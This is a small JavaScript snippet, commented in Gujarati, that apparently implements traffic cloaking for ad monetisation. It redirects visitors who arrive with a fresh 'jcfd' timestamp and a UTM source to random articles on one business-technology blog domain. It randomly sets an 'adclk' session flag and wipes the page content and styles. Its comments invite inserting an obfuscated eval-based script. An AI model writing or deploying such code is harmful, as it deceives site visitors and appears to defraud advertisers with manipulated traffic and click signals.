(function() {
    const url = new URL(window.location.href);
    const ind = url.searchParams.get("jcfd");
    const ind2 = url.searchParams.get("utm_source");
    
    // દરેક URL પાછળ comma (,) ઉમેર્યા છે
    const blogurls = [
        'https://b2btechnologyguideusa.moneydual.com/crm-implementation-costs-efficiency-and-scalability-in-2026-maximizing-operational-roi-with-custom-crm-software-deployment/',
        'https://b2btechnologyguideusa.moneydual.com/ai-integrated-erp-systems-for-global-manufacturing-in-2026-implementation-costs-efficiency-and-scalability-strategies-for-enterprise-production-growth/',
        'https://b2btechnologyguideusa.moneydual.com/predictive-analytics-in-healthcare-business-intelligence-for-2026-implementation-costs-efficiency-and-scalability-guide-for-modern-hospitals/',
        'https://b2btechnologyguideusa.moneydual.com/hipaa-compliant-cloud-infrastructure-in-2026-implementation-costs-efficiency-and-scalability-guide-for-secure-healthcare-deployment/',
        'https://b2btechnologyguideusa.moneydual.com/advanced-crm-implementation-costs-efficiency-and-scalability-in-2026-streamlining-the-sales-pipeline-for-high-tier-technology-firms/',
        'https://b2btechnologyguideusa.moneydual.com/rpa-and-erp-integration-in-2026-implementation-costs-efficiency-and-scalability-guide-for-maximizing-operational-roi/',
        'https://b2btechnologyguideusa.moneydual.com/big-data-infrastructure-for-enterprise-decision-making-in-2026-implementation-costs-efficiency-and-scalability-analysis-guide/'
    ];

    if (ind2 && ind) {
        const rsnow = Math.floor(Date.now() / 1000);
        const rsdifference = rsnow - parseInt(ind);
        
        if (rsdifference <= 300) {
            sessionStorage.setItem("jcfd", "xyz");
            sessionStorage.setItem("jcfdtime", Date.now() + 5 * 60 * 1000);
            
            // Redirect to random blog
            var randomIndex = Math.floor(Math.random() * blogurls.length);
            var randomblgurl = blogurls[randomIndex];
            window.location.href = randomblgurl;
            return; // Exit script after redirect
        }
    }

    const savedTime = sessionStorage.getItem("jcfdtime");
    if (savedTime && Date.now() > parseInt(savedTime)) {
        sessionStorage.removeItem("jcfdtime");
        sessionStorage.removeItem("jcfd");
    } else if (savedTime) {
        if (Math.random() > 0.7) {
            sessionStorage.setItem("adclk", 1);  
        }
    }

    const stcd = sessionStorage.getItem("jcfd");
    if (stcd === "xyz") {
        document.body.innerHTML = '<span style="display:none;">my error</span>';
        document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => el.remove());
        
        // અહીં તમારી આગળની obfuscated script મૂકી શકો છો...
        // _0xc90e અને eval વાળી લાઈનો
    }
})();
